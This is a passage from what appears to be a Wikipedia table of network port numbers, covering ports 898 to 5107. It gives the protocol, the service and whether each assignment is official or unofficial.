898 	TCP 	UDP 	Brocade SMI-S RPC SSL 	Unofficial
901 	TCP 		Samba Web Administration Tool (SWAT) 	Unofficial
901 	TCP 		VMware Virtual Infrastructure Client (UDP from server being managed to management console) 	Unofficial
901 		UDP 	VMware Virtual Infrastructure Client (UDP from server being managed to management console) 	Unofficial
902 	TCP 		ideafarm-door 	Official
902 	TCP 		VMware Server Console (TCP from management console to server being Managed) 	Unofficial
902 		UDP 	ideafarm-door 	Official
902 		UDP 	VMware Server Console (UDP from server being managed to management console) 	Unofficial
903 	TCP 		VMware Remote Console [39] 	Unofficial
904 	TCP 		VMware Server Alternate (if 902 is in use, i.e. SUSE linux) 	Unofficial
911 	TCP 		Network Console on Acid (NCA)—local tty redirection over OpenSSH 	Unofficial
944 		UDP 	Network File System (protocol) Service 	Unofficial
953 	TCP 	UDP 	Domain Name System (DNS) RNDC Service 	Unofficial
973 		UDP 	Network File System (protocol) over IPv6 Service 	Unofficial
981 	TCP 		SofaWare Technologies Remote HTTPS management for firewall devices running embedded Check Point FireWall-1 software 	Unofficial
987 	TCP 		Microsoft Corporation Microsoft Windows SBS SharePoint 	Unofficial
989 	TCP 	UDP 	FTPS Protocol (data): FTP over TLS/SSL 	Official
990 	TCP 	UDP 	FTPS Protocol (control): FTP over TLS/SSL 	Official
991 	TCP 	UDP 	NAS (Netnews Administration System)[40] 	Official
992 	TCP 	UDP 	TELNET protocol over TLS/SSL 	Official
993 	TCP 		Internet Message Access Protocol over SSL (IMAPS) 	Official
995 	TCP 		Post Office Protocol 3 over TLS/SSL (POP3S) 	Official
999 	TCP 		ScimoreDB Database System 	Unofficial
1002 	TCP 		Opsware agent (aka cogbot) 	Unofficial
1023 	TCP 	UDP 	Reserved[1] 	Official
Registered ports
	This article's use of external links may not follow Wikipedia's policies or guidelines. Please improve this article by removing excessive or inappropriate external links, and converting useful links where appropriate into footnote references. (October 2011)

The range of port numbers from 1024 to 49151 are the registered ports. They are assigned by IANA for specific service upon application by a requesting entity.[1] On most systems, registered ports can be used by ordinary users.

This is an incomplete list of notable ports. See the Service Name and Transport Protocol Port Number Registry of IANA for the complete list of assigned ports.


Port 	TCP 	UDP 	Description 	Status
1024 	TCP 	UDP 	Reserved[1] 	Official
1025 	TCP 		NFS or IIS or Teradata 	Unofficial
1026 	TCP 		Often used by Microsoft DCOM services 	Unofficial
1029 	TCP 		Often used by Microsoft DCOM services 	Unofficial
1058 	TCP 	UDP 	nim, IBM AIX Network Installation Manager (NIM) 	Official
1059 	TCP 	UDP 	nimreg, IBM AIX Network Installation Manager (NIM) 	Official
1080 	TCP 		SOCKS proxy 	Official
1085 	TCP 	UDP 	WebObjects 	Official
1098 	TCP 	UDP 	rmiactivation, RMI Activation 	Official
1099 	TCP 	UDP 	rmiregistry, RMI Registry 	Official
1109 		UDP 	Reserved[1] 	Official
1109 	TCP 		Reserved[1] 	Official
1109 	TCP 		Kerberos Post Office Protocol (KPOP) 	Unofficial
1110 		UDP 	EasyBits School network discovery protocol (for Intel's CMPC platform) 	Unofficial
1140 	TCP 	UDP 	AutoNOC protocol 	Official
1167 		UDP 	phone, conference calling 	Unofficial
1169 	TCP 	UDP 	Tripwire 	Official
1176 	TCP 		Perceptive Automation Indigo Home automation server 	Official
1182 	TCP 	UDP 	AcceleNet Intelligent Transfer Protocol 	Official
1194 	TCP 	UDP 	OpenVPN 	Official
1198 	TCP 	UDP 	The cajo project Free dynamic transparent distributed computing in Java 	Official
1200 	TCP 		scol, protocol used by SCOL 3D virtual worlds server to answer world name resolution client request[41] 	Official
1200 		UDP 	scol, protocol used by SCOL 3D virtual worlds server to answer world name resolution client request 	Official
1200 		UDP 	Steam Friends Applet 	Unofficial
1214 	TCP 		Kazaa 	Official
1217 	TCP 		Uvora Online 	Unofficial
1220 	TCP 		QuickTime Streaming Server administration 	Official
1223 	TCP 	UDP 	TGP, TrulyGlobal Protocol, also known as "The Gur Protocol" (named for Gur Kimchi of TrulyGlobal) 	Official
1232 	TCP 	UDP 	first-defense, Remote systems monitoring service from Nexum, Inc 	Official
1234 		UDP 	VLC media player default port for UDP/RTP stream 	Unofficial
1236 	TCP 		Symantec BindView Control UNIX Default port for TCP management server connections 	Unofficial
1241 	TCP 	UDP 	Nessus Security Scanner 	Official
1270 	TCP 	UDP 	Microsoft System Center Operations Manager (SCOM) (formerly Microsoft Operations Manager (MOM)) agent 	Official
1293 	TCP 	UDP 	IPSec (Internet Protocol Security) 	Official
1301 	TCP 		Palmer Performance OBDNet 	Unofficial
1309 	TCP 		Altera Quartus jtagd 	Unofficial
1311 	TCP 		Dell OpenManage HTTPS 	Official
1313 	TCP 		Xbiim (Canvii server)[citation needed] 	Unofficial
1314 	TCP 		Festival Speech Synthesis System 	Unofficial
1319 	TCP 		AMX ICSP 	Official
1319 		UDP 	AMX ICSP 	Official
1337 		UDP 	Men and Mice DNS 	Official
1337 	TCP 		Men and Mice DNS 	Official
1337 	TCP 		PowerFolder P2P Encrypted File Synchronization Program 	Unofficial
1337 	TCP 		WASTE Encrypted File Sharing Program 	Unofficial
1344 	TCP 		Internet Content Adaptation Protocol 	Official
1352 	TCP 		IBM Lotus Notes/Domino[42] (RPC) protocol 	Official
1387 	TCP 	UDP 	cadsi-lm, LMS International (formerly Computer Aided Design Software, Inc. (CADSI)) LM 	Official
1414 	TCP 		IBM WebSphere MQ (formerly known as MQSeries) 	Official
1417 	TCP 	UDP 	Timbuktu Service 1 Port 	Official
1418 	TCP 	UDP 	Timbuktu Service 2 Port 	Official
1419 	TCP 	UDP 	Timbuktu Service 3 Port 	Official
1420 	TCP 	UDP 	Timbuktu Service 4 Port 	Official
1431 	TCP 		Reverse Gossip Transport Protocol (RGTP), used to access a General-purpose Reverse-Ordered Gossip Gathering System (GROGGS) bulletin board, such as that implemented on the Cambridge University's Phoenix system 	Official
1433 	TCP 		MSSQL (Microsoft SQL Server database management system) Server 	Official
1434 	TCP 	UDP 	MSSQL (Microsoft SQL Server database management system) Monitor 	Official
1470 	TCP 		Solarwinds Kiwi Log Server 	Official
1494 	TCP 		Citrix XenApp Independent Computing Architecture (ICA) thin client protocol 	Official
1500 	TCP 		NetGuard GuardianPro firewall (NT4-based) Remote Management 	Unofficial
1501 		UDP 	NetGuard GuardianPro firewall (NT4-based) Authentication Client 	Unofficial
1503 	TCP 	UDP 	Windows Live Messenger (Whiteboard and Application Sharing) 	Unofficial
1512 	TCP 	UDP 	Microsoft Windows Internet Name Service (WINS) 	Official
1513 	TCP 	UDP 	Garena Garena Gaming Client 	Official
1521 	TCP 		nCube License Manager 	Official
1521 	TCP 		Oracle database default listener, in future releases official port 2483 	Unofficial
1524 	TCP 	UDP 	ingreslock, ingres 	Official
1526 	TCP 		Oracle database common alternative for listener 	Unofficial
1527 	TCP 		Apache Derby Network Server default port 	Unofficial
1533 	TCP 		IBM Sametime IM—Virtual Places Chat Microsoft SQL Server 	Official
1534 		UDP 	Eclipse Target Communication Framework (TCF) agent discovery[43] 	Unofficial
1547 	TCP 	UDP 	Laplink 	Official
1550 	TCP 	UDP 	3m-image-lm Image Storage license manager 3M Company 	Official
1550 			Gadu-Gadu (direct client-to-client) 	Unofficial
1581 		UDP 	MIL STD 2045-47001 VMF 	Official
1589 		UDP 	Cisco VQP (VLAN Query Protocol) / VMPS 	Unofficial
1590 	TCP 		GE Smallworld Datastore Server (SWMFS/Smallworld Master Filesystem)[citation needed] 	Unofficial
1627 			iSketch[citation needed] 	Unofficial
1645 	TCP 	UDP 	radius auth, RADIUS authentication protocol (default for Cisco and Juniper Networks RADIUS servers, but see port 1812 below) 	Unofficial
1646 	TCP 	UDP 	radius acct, RADIUS authentication protocol (default for Cisco and Juniper Networks RADIUS servers, but see port 1813 below) 	Unofficial
1666 	TCP 		Perforce 	Unofficial
1677 	TCP 	UDP 	Novell GroupWise clients in client/server access mode 	Official
1688 	TCP 		Microsoft Key Management Service for KMS Windows Activation 	Unofficial
1700 		UDP 	Cisco RADIUS Change of Authorization for TrustSec[citation needed] 	Unofficial
1701 		UDP 	Layer 2 Forwarding Protocol (L2F) & Layer 2 Tunneling Protocol (L2TP) 	Official
1707 	TCP 	UDP 	Windward Studios 	Official
1707 		TCP 	Romtoc Packet Protocol (L2F) & Layer 2 Tunneling Protocol (L2TP) 	Unofficial
1716 	TCP 		America's Army Massively multiplayer online game (MMO) 	Unofficial
1719 		UDP 	H.323 Registration and alternate communication 	Official
1720 	TCP 		H.323 Call signalling 	Official
1723 	TCP 	UDP 	Microsoft Point-to-Point Tunneling Protocol (PPTP) 	Official
1725 		UDP 	Valve Steam Client 	Unofficial
1755 	TCP 	UDP 	Microsoft Media Services (MMS, ms-streaming) 	Official
1761 		UDP 	cft-0 	Official
1761 	TCP 		cft-0 	Official
1761 	TCP 		Novell Zenworks Remote Control utility 	Unofficial
1762–1768 	TCP 	UDP 	cft-1 to cft-7 	Official
1792 	TCP 	UDP 	Moby[citation needed] 	Unofficial
1801 	TCP 	UDP 	Microsoft Message Queuing 	Official
1812 	TCP 	UDP 	radius, RADIUS authentication protocol 	Official
1813 	TCP 	UDP 	radacct, RADIUS accounting protocol 	Official
1863 	TCP 		MSNP (Microsoft Notification Protocol), used by the Microsoft Messenger service and a number of Instant Messaging clients 	Official
1883 	TCP 	UDP 	MQ Telemetry Transport (MQTT), formerly known as MQIsdp (MQSeries SCADA protocol) 	Official
1886 	TCP 		Leonardo over IP Pro2col Ltd 	Unofficial
1900 		UDP 	Microsoft SSDP Enables discovery of UPnP devices 	Official
1920 	TCP 		IBM Tivoli monitoring console 	Unofficial
1935 	TCP 		Adobe Systems Macromedia Flash Real Time Messaging Protocol (RTMP) "plain" protocol 	Official
1947 	TCP 	UDP 	SentinelSRM (hasplm), Aladdin HASP License Manager 	Official
1967 		UDP 	Cisco IOS IP Service Level Agreements (IP SLAs) Control Protocol[citation needed] 	Unofficial
1970 	TCP 	UDP 	Netop Business Solutions Netop Remote Control 	Official
1971 	TCP 	UDP 	Netop Business Solutions Netop School 	Official
1972 	TCP 	UDP 	InterSystems Caché 	Official
1975–1977 		UDP 	Cisco TCO (Documentation) 	Official
1984 	TCP 		Big Brother and related Xymon (formerly Hobbit) System and Network Monitor 	Official
1985 		UDP 	Cisco HSRP 	Official
1994 	TCP 	UDP 	Cisco STUN-SDLC (Serial Tunneling—Synchronous Data Link Control) protocol 	Official
1997 	TCP 		Chizmo Networks Transfer Tool[citation needed] 	Unofficial
1998 	TCP 	UDP 	Cisco X.25 over TCP (XOT) service 	Official
2000 	TCP 	UDP 	Cisco SCCP (Skinny) 	Official
2001 		UDP 	CAPTAN Test Stand System 	Unofficial
2002 	TCP 		Secure Access Control Server (ACS) for Windows[citation needed] 	Unofficial
2010 	TCP 		Artemis: Spaceship Bridge Simulator default port 	Unofficial
2030 			Oracle services for Microsoft Transaction Server 	Unofficial
2031 	TCP 	UDP 	mobrien-chat(http://chat.mobrien.com:2031) 	Official
2041 	TCP 		Mail.Ru Agent communication protocol[citation needed] 	Unofficial
2049 	TCP 	UDP 	NFS (Network File System) 	Official
2049 		UDP 	shilp 	Official
2053 	TCP 		knetd Kerberos de-multiplexor 	Unofficial
2056 		UDP 	Civilization 4 multiplayer 	Unofficial
2074 	TCP 	UDP 	Vertel VMF SA (i.e. App.. SpeakFreely) 	Official
2080 	TCP 	UDP 	Autodesk NLM (FLEXlm) 	Official
2082 	TCP 		Infowave Mobility Server 	Official
2082 	TCP 		CPanel default 	Unofficial
2083 	TCP 		Secure Radius Service (radsec) 	Official
2083 	TCP 		CPanel default SSL 	Unofficial
2086 	TCP 		GNUnet 	Official
2086 	TCP 		WebHost Manager default 	Unofficial
2087 	TCP 		WebHost Manager default SSL 	Unofficial
2095 	TCP 		CPanel default Web mail 	Unofficial
2096 	TCP 		CPanel default SSL Web mail 	Unofficial
2102 	TCP 	UDP 	zephyr-srv Project Athena Zephyr Notification Service server 	Official
2103 	TCP 	UDP 	zephyr-clt Project Athena Zephyr Notification Service serv-hm connection 	Official
2104 	TCP 	UDP 	zephyr-hm Project Athena Zephyr Notification Service hostmanager 	Official
2105 	TCP 	UDP 	IBM MiniPay 	Official
2105 	TCP 	UDP 	eklogin Kerberos encrypted remote login (rlogin) 	Unofficial
2105 	TCP 	UDP 	zephyr-hm-srv Project Athena Zephyr Notification Service hm-serv connection (should use port 2102) 	Unofficial
2121 	TCP 		FTP proxy[citation needed] 	Unofficial
2144 	TCP 		Iron Mountain LiveVault Agent[citation needed] 	Unofficial
2145 	TCP 		Iron Mountain LiveVault Agent[citation needed] 	Unofficial
2156 		UDP 	Talari Reliable Protocol 	Official
2160 	TCP 		APC Agent 	Official
2161 	TCP 		APC Agent 	Official
2181 	TCP 	UDP 	EForward-document transport system 	Official
2190 		UDP 	TiVoConnect Beacon[citation needed] 	Unofficial
2195 	TCP 		Apple Push Notification service (http://developer.apple.com/library/ios/#DOCUMENTATION/NetworkingInternet/Conceptual/RemoteNotificationsPG/CommunicatingWIthAPS/CommunicatingWIthAPS.html) 	Unofficial
2196 	TCP 		Apple Push Notification - Feedback (http://developer.apple.com/library/ios/#DOCUMENTATION/NetworkingInternet/Conceptual/RemoteNotificationsPG/CommunicatingWIthAPS/CommunicatingWIthAPS.html) 	Unofficial
2200 		UDP 	Tuxanci game server[44] 	Unofficial
2210 		UDP 	NOAAPORT Broadcast Network 	Official
2210 	TCP 		NOAAPORT Broadcast Network 	Official
2210 	TCP 		MikroTik Remote management for "The Dude" 	Unofficial
2211 		UDP 	EMWIN 	Official
2211 	TCP 		EMWIN 	Official
2211 	TCP 		MikroTik Secure management for "The Dude" 	Unofficial
2212 		UDP 	LeeCO POS Server Service 	Official
2212 	TCP 		LeeCO POS Server Service 	Official
2212 	TCP 		Port-A-Pour Remote WinBatch 	Unofficial
2219 	TCP 	UDP 	NetIQ NCAP Protocol 	Official
2220 	TCP 	UDP 	NetIQ End2End 	Official
2221 	TCP 		ESET Anti-virus updates 	Unofficial
2222 	TCP 		DirectAdmin default & ESET Remote Administration 	Unofficial
2223 		UDP 	Microsoft Office OS X antipiracy network monitor[citation needed] 	Unofficial
2261 	TCP 	UDP 	CoMotion Master 	Official
2262 	TCP 	UDP 	CoMotion Backup 	Official
2301 	TCP 		HP System Management Redirect to port 2381[citation needed] 	Unofficial
2302 		UDP 	ArmA multiplayer (default for game) 	Unofficial
2302 		UDP 	Halo: Combat Evolved multiplayer 	Unofficial
2303 		UDP 	ArmA multiplayer (default for server reporting) (default port for game +1) 	Unofficial
2305 		UDP 	ArmA multiplayer (default for VoN) (default port for game +3) 	Unofficial
2323 	TCP 		Philips TVs based on jointSPACE [45] 	Unofficial
2369 	TCP 		Default for BMC Software Control-M/Server—Configuration Agent, though often changed during installation 	Official
2370 	TCP 		Default for BMC Software Control-M/Server—to allow the Control-M/Enterprise Manager to connect to the Control-M/Server, though often changed during installation 	Official
2379 	TCP 		KGS Go Server 	Unofficial
2381 	TCP 		HP Insight Manager default for Web server[citation needed] 	Unofficial
2399 	TCP 		FileMaker Data Access Layer (ODBC/JDBC) 	Official
2401 	TCP 		CVS version control system 	Unofficial
2404 	TCP 		IEC 60870-5 -104, used to send electric power telecontrol messages between two systems via directly connected data circuits 	Official
2420 		UDP 	Westell Remote Access 	Official
2424 	TCP 		OrientDB database listening for Binary client connections 	Official
2427 		UDP 	Cisco MGCP 	Official
2447 	TCP 	UDP 	ovwdb—OpenView Network Node Manager (NNM) daemon 	Official
2463 	TCP 	UDP 	LSI RAID Management formerly Symbios Logic 	Official
2480 	TCP 		OrientDB database listening for HTTP client connections 	Official
2483 	TCP 	UDP 	Oracle database listening for unsecure client connections to the listener, replaces port 1521 	Official
2484 	TCP 	UDP 	Oracle database listening for SSL client connections to the listener 	Official
2500 	TCP 		THEÒSMESSENGER listening for TheòsMessenger client connections 	Official
2501 	TCP 		TheosNet-Admin listening for TheòsMessenger client connections 	Official
2518 	TCP 	UDP 	Willy 	Official
2525 	TCP 		SMTP alternate[citation needed] 	Unofficial
2535 	TCP 		MADCAP - Multicast Address Dynamic Client Allocation Protocol 	Official
2546 	TCP 	UDP 	EVault data protection services 	Unofficial
2593 	TCP 	UDP 	RunUO—Ultima Online server 	Unofficial
2598 	TCP 		new ICA (Citrix) —when Session Reliability is enabled, TCP port 2598 replaces port 1494[citation needed] 	Unofficial
2599 	TCP 		SonicWALL anti-spam traffic between Remote Analyzer (RA) and Control Center (CC) 	Unofficial
2610 	TCP 		TrackiT mobile device monitoring 	Unofficial
2612 	TCP 	UDP 	QPasa from MQSoftware 	Official
2636 	TCP 		Solve Service 	Official
2638 	TCP 		Sybase database listener[citation needed] 	Unofficial
2641 	TCP 	UDP 	HDL Server from CNRI 	Official
2642 	TCP 	UDP 	Tragic 	Official
2698 	TCP 	UDP 	Citel / MCK IVPIP 	Official
2700–2800 	TCP 		KnowShowGo P2P 	Official
2710 	TCP 		XBT Tracker 	Unofficial
2710 		UDP 	XBT Tracker experimental UDP tracker extension 	Unofficial
2710 	TCP 		Knuddels.de[citation needed] 	Unofficial
2735 	TCP 	UDP 	NetIQ Monitor Console 	Official
2809 	TCP 		corbaloc:iiop URL, per the CORBA 3.0.3 specification 	Official
2809 	TCP 		IBM WebSphere Application Server (WAS) Bootstrap/rmi default 	Unofficial
2809 		UDP 	corbaloc:iiop URL, per the CORBA 3.0.3 specification. 	Official
2827 	TCP 		I2P Basic Open Bridge API 	Unofficial
2868 	TCP 	UDP 	Norman Proprietary Event Protocol NPEP 	Official
2944 		UDP 	Megaco text H.248 	Unofficial
2945 		UDP 	Megaco binary (ASN.1) H.248 	Unofficial
2947 	TCP 		gpsd GPS daemon 	Official
2948 	TCP 	UDP 	WAP-push Multimedia Messaging Service (MMS) 	Official
2949 	TCP 	UDP 	WAP-pushsecure Multimedia Messaging Service (MMS) 	Official
2967 	TCP 		Symantec AntiVirus Corporate Edition 	Unofficial
3000 	TCP 		Miralix License server[citation needed] 	Unofficial
3000 	TCP 		Cloud9 Integrated Development Environment server 	Unofficial
3000 		UDP 	Distributed Interactive Simulation (DIS), modifiable default 	Unofficial
3000 	TCP 		Ruby on Rails development default[46] 	Unofficial
3001 	TCP 		Miralix Phone Monitor[citation needed] 	Unofficial
3001 	TCP 		Opsware server (Satellite) 	Unofficial
3002 	TCP 		Miralix CSTA[citation needed] 	Unofficial
3003 	TCP 		Miralix GreenBox API[citation needed] 	Unofficial
3004 	TCP 		Miralix InfoLink[citation needed] 	Unofficial
3005 	TCP 		Miralix TimeOut[citation needed] 	Unofficial
3006 	TCP 		Miralix SMS Client Connector[citation needed] 	Unofficial
3007 	TCP 		Miralix OM Server[citation needed] 	Unofficial
3008 	TCP 		Miralix Proxy[citation needed] 	Unofficial
3017 	TCP 		Miralix IVR and Voicemail[citation needed] 	Unofficial
3025 	TCP 		netpd.org[citation needed] 	Unofficial
3030 	TCP 	UDP 	NetPanzer 	Unofficial
3050 	TCP 	UDP 	gds_db (Interbase/Firebird) 	Official
3051 	TCP 	UDP 	Galaxy Server (Gateway Ticketing Systems) 	Official
3052 	TCP 	UDP 	APC PowerChute Network [1] 	Official
3074 	TCP 	UDP 	Xbox LIVE and/or Games for Windows - LIVE 	Official
3100 	TCP 		SMAUSA OpCon Scheduler as the default listen port[citation needed] 	Official
3101 	TCP 		BlackBerry Enterprise Server communication to cloud 	Unofficial
3119 	TCP 		D2000 Entis/Actis Application server 	Official
3128 	TCP 		Web caches and the default for the Squid (software) 	Unofficial
3128 	TCP 		Tatsoft default client connection[citation needed] 	Unofficial
3162 	TCP 	UDP 	SFLM (Standard Floating License Manager) 	Official
3225 	TCP 	UDP 	FCIP (Fiber Channel over Internet Protocol) 	Official
3233 	TCP 	UDP 	WhiskerControl research control protocol 	Official
3235 	TCP 	UDP 	Galaxy Network Service (Gateway Ticketing Systems) 	Official
3260 	TCP 		iSCSI target 	Official
3268 	TCP 	UDP 	msft-gc, Microsoft Global Catalog (LDAP service which contains data from Active Directory forests) 	Official
3269 	TCP 	UDP 	msft-gc-ssl, Microsoft Global Catalog over SSL (similar to port 3268, LDAP over SSL) 	Official
3283 	TCP 		Apple Remote Desktop reporting (officially Net Assistant, referring to an earlier product) 	Official
3299 	TCP 		SAP-Router (routing application proxy for SAP R/3) 	Unofficial
3300 	TCP 	UDP 	Debate Gopher backend database system[citation needed] 	Unofficial
3305 	TCP 	UDP 	odette-ftp, Odette File Transfer Protocol (OFTP) 	Official
3306 	TCP 	UDP 	MySQL database system 	Official
3313 	TCP 		Verisys file integrity monitoring software 	Unofficial
3333 	TCP 		Network Caller ID server 	Unofficial
3333 	TCP 		CruiseControl.rb[47] 	Unofficial
3386 	TCP 	UDP 	GTP' 3GPP GSM/UMTS CDR logging protocol 	Official
3389 	TCP 	UDP 	Microsoft Terminal Server (RDP) officially registered as Windows Based Terminal (WBT) - Link 	Official
3396 	TCP 	UDP 	Novell NDPS Printer Agent 	Official
3412 	TCP 	UDP 	xmlBlaster 	Official
3455 	TCP 	UDP 	[RSVP] Reservation Protocol 	Official
3423 	TCP 		Xware xTrm Communication Protocol 	Official
3424 	TCP 		Xware xTrm Communication Protocol over SSL 	Official
3478 	TCP 	UDP 	STUN, a protocol for NAT traversal[48] 	Official
3478 	TCP 	UDP 	TURN, a protocol for NAT traversal[49] 	Official
3483 		UDP 	Slim Devices discovery protocol 	Official
3483 	TCP 		Slim Devices SlimProto protocol 	Official
3516 	TCP 	UDP 	Smartcard Port 	Official
3527 		UDP 	Microsoft Message Queuing 	Official
3535 	TCP 		SMTP alternate[50] 	Unofficial
3537 	TCP 	UDP 	ni-visa-remote[citation needed] 	Unofficial
3544 		UDP 	Teredo tunneling 	Official
3605 		UDP 	ComCam IO Port 	Official
3606 	TCP 	UDP 	Splitlock Server 	Official
3632 	TCP 		distributed compiler 	Official
3689 	TCP 		Digital Audio Access Protocol (DAAP)—used by Apple’s iTunes and AirPort Express 	Official
3690 	TCP 	UDP 	Subversion (SVN) version control system 	Official
3702 	TCP 	UDP 	Web Services Dynamic Discovery (WS-Discovery), used by various components of Windows Vista 	Official
3723 	TCP 	UDP 	Used by many Battle.net Blizzard games (Diablo II, Warcraft II, Warcraft III, StarCraft) 	Unofficial
3724 	TCP 		World of Warcraft Online gaming MMORPG 	Official
3724 	TCP 		Club Penguin Disney online game for kids 	Unofficial
3724 		UDP 	World of Warcraft Online gaming MMORPG 	Official
3784 	TCP 	UDP 	VoIP program used by Ventrilo 	Unofficial
3785 		UDP 	VoIP program used by Ventrilo 	Unofficial
3799 		UDP 	RADIUS change of authorization 	Unofficial
3800 	TCP 		Used by HGG programs[citation needed] 	Unofficial
3825 	TCP 		Used by RedSeal Networks client/server connection[citation needed] 	Unofficial
3826 	TCP 		Used by RedSeal Networks client/server connection[citation needed] 	Unofficial
3835 	TCP 		Used by RedSeal Networks client/server connection[citation needed] 	Unofficial
3880 	TCP 	UDP 	IGRS 	Official
3868 	TCP 	SCTP 	Diameter base protocol (RFC 3588) 	Official
3872 	TCP 		Oracle Management Remote Agent[citation needed] 	Unofficial
3899 	TCP 		Remote Administrator 	Unofficial
3900 	TCP 		udt_os, IBM UniData UDT OS[51] 	Official
3945 	TCP 	UDP 	EMCADS service, a Giritech product used by G/On 	Official
3978 	TCP 	UDP 	OpenTTD game (masterserver and content service) 	Unofficial
3979 	TCP 	UDP 	OpenTTD game 	Unofficial
3999 	TCP 	UDP 	Norman distributed scanning service 	Official
4000 	TCP 	UDP 	Diablo II game 	Unofficial
4001 	TCP 		Microsoft Ants game 	Unofficial
4007 	TCP 		PrintBuzzer printer monitoring socket server[citation needed] 	Unofficial
4018 	TCP 	UDP 	protocol information and warnings 	Official
4035 	TCP 	TCP 	IBM Rational Developer for System z Remote System Explorer Daemon 	Unofficial
4045 	TCP 	UDP 	Solaris lockd NFS lock daemon/manager 	Unofficial
4069 		UDP 	Minger Email Address Verification Protocol[52] 	Official
4089 	TCP 	UDP 	OpenCORE Remote Control Service 	Official
4093 	TCP 	UDP 	PxPlus Client server interface ProvideX 	Official
4096 	TCP 	UDP 	Ascom Timeplex BRE (Bridge Relay Element) 	Official
4100 			WatchGuard authentication applet default 	Unofficial
4111 	TCP 		Xgrid 	Official
4116 	TCP 	UDP 	Smartcard-TLS 	Official
4125 	TCP 		Microsoft Remote Web Workplace administration 	Unofficial
4172 	TCP 	UDP 	Teradici PCoIP 	Official
4201 	TCP 		TinyMUD and various derivatives 	Unofficial
4226 	TCP 	UDP 	Aleph One (game) 	Unofficial
4224 	TCP 		Cisco Audio Session Tunneling[citation needed] 	Unofficial
4242 	TCP 		Reverse Battle Tetris 	Unofficial
4321 	TCP 		Referral Whois (RWhois) Protocol[53] 	Official
4323 		UDP 	Lincoln Electric's ArcLink/XT[citation needed] 	Unofficial
4433-4436 	TCP 		Axence nVision[citation needed] 	Unofficial
4444-4445 	TCP 		I2P HTTP/S proxy 	Unofficial
4486 	TCP 	UDP 	Integrated Client Message Service (ICMS) 	Official
4500 		UDP 	IPSec NAT Traversal (RFC 3947) 	Official
4502-4534 	TCP 		Microsoft Silverlight connectable ports under non-elevated trust 	Official
4534 		UDP 	Armagetron Advanced default server port 	Unofficial
4567 	TCP 		Sinatra default server port in development mode (HTTP) 	Unofficial
4569 		UDP 	Inter-Asterisk eXchange (IAX2) 	Official
4610–4640 	TCP 		QualiSystems TestShell Suite Services 	Unofficial
4662 		UDP 	OrbitNet Message Service 	Official
4662 	TCP 		OrbitNet Message Service 	Official
4662 	TCP 		Default for older versions of eMule[54] 	Unofficial
4664 	TCP 		Google Desktop Search 	Unofficial
4672 		UDP 	Default for older versions of eMule[54] 	Unofficial
4711 	TCP 		eMule optional web interface[54] 	Unofficial
4711 	TCP 		McAfee Web Gateway 7 - Default GUI Port HTTP[citation needed] 	Unofficial
4712 	TCP 		McAfee Web Gateway 7 - Default GUI Port HTTPS[citation needed] 	Unofficial
4713 	TCP 		PulseAudio sound server 	Unofficial
4728 	TCP 		Computer Associates Desktop and Server Management (DMP)/Port Multiplexer [55] 	Official
4732 		UDP 	Digital Airways' OHM server's commands to mobile devices (used mainly for binary SMS) 	Official
4747 	TCP 		Apprentice 	Unofficial
4750 	TCP 		BladeLogic Agent 	Unofficial
4840 	TCP 	UDP 	OPC UA TCP Protocol for OPC Unified Architecture from OPC Foundation 	Official
4843 	TCP 	UDP 	OPC UA TCP Protocol over TLS/SSL for OPC Unified Architecture from OPC Foundation 	Official
4847 	TCP 	UDP 	Web Fresh Communication, Quadrion Software & Odorless Entertainment 	Official
4894 	TCP 	UDP 	LysKOM Protocol A 	Official
4899 	TCP 	UDP 	Radmin remote administration tool 	Official
4949 	TCP 		Munin Resource Monitoring Tool 	Official
4950 	TCP 	UDP 	Cylon Controls UC32 Communications Port 	Official
4982 	TCP 	UDP 	Solar Data Log (JK client app for PV solar inverters)[citation needed] 	Unofficial
4993 	TCP 	UDP 	Home FTP Server web Interface Default Port[citation needed] 	Unofficial
5000 	TCP 		commplex-main 	Official
5000 	TCP 		UPnP—Windows network device interoperability 	Unofficial
5000 	TCP 	UDP 	VTun—VPN Software 	Unofficial
5000 		UDP 	FlightGear multiplayer[56] 	Unofficial
5001 	TCP 		commplex-link 	Official
5001 	TCP 		Slingbox and Slingplayer 	Unofficial
5001 	TCP 		Iperf (Tool for measuring TCP and UDP bandwidth performance) 	Unofficial
5001 		UDP 	Iperf (Tool for measuring TCP and UDP bandwidth performance) 	Unofficial
5002 	TCP 		SOLICARD ARX[57] 	Unofficial
5002 		UDP 	Drobo Dashboard[58] 	Unofficial
5003 	TCP 	UDP 	FileMaker 	Official
5004 	TCP 	UDP 	RTP (Real-time Transport Protocol) media data (RFC 3551, RFC 4571) 	Official
5004 	DCCP 		RTP (Real-time Transport Protocol) media data (RFC 3551, RFC 4571) 	Official
5005 	TCP 	UDP 	RTP (Real-time Transport Protocol) control protocol (RFC 3551, RFC 4571) 	Official
5005 	DCCP 		RTP (Real-time Transport Protocol) control protocol (RFC 3551, RFC 4571) 	Official
5010 	TCP 	UDP 	Registered to: TelePath (the IBM FlowMark workflow-management system messaging platform)[59]
The TCP port is now used for: IBM WebSphere MQ Workflow 	Official
5011 	TCP 	UDP 	TelePath (the IBM FlowMark workflow-management system messaging platform)[59] 	Official
5029 	TCP 		Sonic Robo Blast 2 : Multiplayer[60] 	Unofficial
5031 	TCP 	UDP 	AVM CAPI-over-TCP (ISDN over Ethernet tunneling)[citation needed] 	Unofficial
5037 	TCP 		Android ADB server 	Unofficial
5050 	TCP 		Yahoo! Messenger 	Unofficial
5051 	TCP 		ita-agent Symantec Intruder Alert[61] 	Official
5060 	TCP 	UDP 	Session Initiation Protocol (SIP) 	Official
5061 	TCP 		Session Initiation Protocol (SIP) over TLS 	Official
5070 	TCP 		Binary Floor Control Protocol (BFCP),[62] published as RFC 4582, is a protocol that allows for an additional video channel (known as the content channel) alongside the main video channel in a video-conferencing call that uses SIP. Also used for Session Initiation Protocol (SIP) preferred port for PUBLISH on SIP Trunk to Cisco Unified Presence Server (CUPS) 	Unofficial
5082 	TCP 	UDP 	Qpur Communication Protocol 	Official
5083 	TCP 	UDP 	Qpur File Protocol 	Official
5084 	TCP 	UDP 	EPCglobal Low Level Reader Protocol (LLRP) 	Official
5085 	TCP 	UDP 	EPCglobal Low Level Reader Protocol (LLRP) over TLS 	Official
5093 		UDP 	SafeNet, Inc Sentinel LM, Sentinel RMS, License Manager, Client-to-Server 	Official
5099 	TCP 	UDP 	SafeNet, Inc Sentinel LM, Sentinel RMS, License Manager, Server-to-Server 	Official
5104 	TCP 		IBM Tivoli Framework NetCOOL/Impact[63] HTTP Service 	Unofficial
5106 	TCP 		A-Talk Common connection[citation needed] 	Unofficial
5107 	TCP 		A-Talk Remote server connection[citation needed] 	Unofficial
